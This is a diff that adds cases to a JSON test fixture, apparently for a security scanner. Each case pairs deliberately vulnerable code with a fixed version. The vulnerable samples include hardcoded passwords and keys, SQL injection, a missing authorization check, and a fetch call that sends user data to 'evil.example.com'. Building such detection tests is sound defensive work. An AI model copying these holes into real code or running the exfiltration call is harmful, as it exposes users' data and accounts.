@@ -30,5 +30,53 @@
     "expected": [{ "issueType": "Missing Validation", "lineNumber": 7 }],
     "code": "package demo;\n\n@RestController\n@RequestMapping(\"/users\")\npublic class UserController {\n\n  @PostMapping\n  public User create(@RequestBody User user) {\n    return userService.save(user);\n  }\n}\n",
     "safeCode": "package demo;\n\n@RestController\n@RequestMapping(\"/users\")\npublic class UserController {\n\n  @PostMapping\n  public User create(@Valid @RequestBody User user) {\n    return userService.save(user);\n  }\n}\n"
+  },
+  {
+    "id": "weak-authentication",
+    "title": "Weak default password",
+    "fileName": "src/auth.js",
+    "expected": [{ "issueType": "Weak Authentication", "lineNumber": 2 }],
+    "code": "function checkPassword(password) {\n  if (password === \"admin123\") {\n    return true;\n  }\n  return false;\n}\n",
+    "safeCode": "const bcrypt = require(\"bcrypt\");\n\nasync function checkPassword(password, user) {\n  return bcrypt.compare(password, user.passwordHash);\n}\n"
+  },
+  {
+    "id": "template-literal-sql",
+    "title": "SQL injection in a template string",
+    "fileName": "src/orders.js",
+    "expected": [{ "issueType": "SQL Injection Risk (Template Literal)", "lineNumber": 3 }],
+    "code": "async function searchOrders(db, req) {\n  const status = req.query.status;\n  return db.query(`SELECT * FROM orders WHERE status = '${status}'`);\n}\n",
+    "safeCode": "async function searchOrders(db, req) {\n  const status = req.query.status;\n  return db.query(\"SELECT * FROM orders WHERE status = $1\", [status]);\n}\n"
+  },
+  {
+    "id": "aws-access-key",
+    "title": "AWS access key in code",
+    "fileName": "src/storage.js",
+    "expected": [{ "issueType": "AWS Access Key", "lineNumber": 6 }],
+    "code": "const { S3Client } = require(\"@aws-sdk/client-s3\");\n\nconst s3 = new S3Client({\n  region: \"us-east-1\",\n  credentials: {\n    accessKeyId: \"AKIAIOSFODNN7EXAMPLE\",\n    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,\n  },\n});\n",
+    "safeCode": "const { S3Client } = require(\"@aws-sdk/client-s3\");\n\n// Credentials come from the environment or an IAM role.\nconst s3 = new S3Client({ region: \"us-east-1\" });\n"
+  },
+  {
+    "id": "private-key",
+    "title": "Private key embedded in code",
+    "fileName": "src/jwt.js",
+    "expected": [{ "issueType": "Private Key Exposure", "lineNumber": 3 }],
+    "code": "const jwt = require(\"jsonwebtoken\");\n\nconst signingKey = `-----BEGIN PRIVATE KEY-----\nDEMO-NOT-A-REAL-KEY\n-----END PRIVATE KEY-----`;\n\nfunction sign(payload) {\n  return jwt.sign(payload, signingKey, { algorithm: \"RS256\" });\n}\n",
+    "safeCode": "const fs = require(\"fs\");\nconst jwt = require(\"jsonwebtoken\");\n\nconst signingKey = fs.readFileSync(process.env.JWT_KEY_PATH, \"utf8\");\n\nfunction sign(payload) {\n  return jwt.sign(payload, signingKey, { algorithm: \"RS256\" });\n}\n"
+  },
+  {
+    "id": "data-exfiltration",
+    "title": "Sending user data to an unknown server",
+    "fileName": "src/session.js",
+    "expected": [{ "issueType": "Suspicious Data Exfiltration", "lineNumber": 3 }],
+    "code": "function onLogin(user) {\n  saveSession(user);\n  fetch(\"https://evil.example.com/collect?d=\" + JSON.stringify(user));\n}\n",
+    "safeCode": "function onLogin(user) {\n  saveSession(user);\n  logger.info(\"user logged in\", { id: user.id });\n}\n"
+  },
+  {
+    "id": "multiple-issues",
+    "title": "One file, four problems",
+    "fileName": "src/server.js",
+    "expected": [{ "issueType": "Hardcoded API Key", "lineNumber": 4 }, { "issueType": "Missing Authorization Check", "lineNumber": 6 }, { "issueType": "SQL Injection Risk", "lineNumber": 7 }, { "issueType": "Weak Authentication", "lineNumber": 12 }],
+    "code": "const express = require(\"express\");\nconst app = express();\n\nconst api_key = \"demo-not-a-real-key-999\";\n\napp.get(\"/admin/export\", async (req, res) => {\n  const sql = \"SELECT * FROM users WHERE team = \" + req.query.team;\n  res.json(await db.query(sql));\n});\n\napp.post(\"/login\", (req, res) => {\n  if (req.body.password === \"letmein\") return res.send(\"ok\");\n  res.sendStatus(401);\n});\n",
+    "safeCode": "const express = require(\"express\");\nconst bcrypt = require(\"bcrypt\");\nconst { requireAdmin } = require(\"./auth\");\nconst app = express();\n\nconst apiKey = process.env.API_KEY;\n\napp.get(\"/admin/export\", requireAdmin, async (req, res) => {\n  const sql = \"SELECT * FROM users WHERE team = ?\";\n  res.json(await db.query(sql, [req.query.team]));\n});\n\napp.post(\"/login\", async (req, res) => {\n  const user = await findUser(req.body.username);\n  if (user && await bcrypt.compare(req.body.password, user.passwordHash)) return res.send(\"ok\");\n  res.sendStatus(401);\n});\n"
   }
 ]
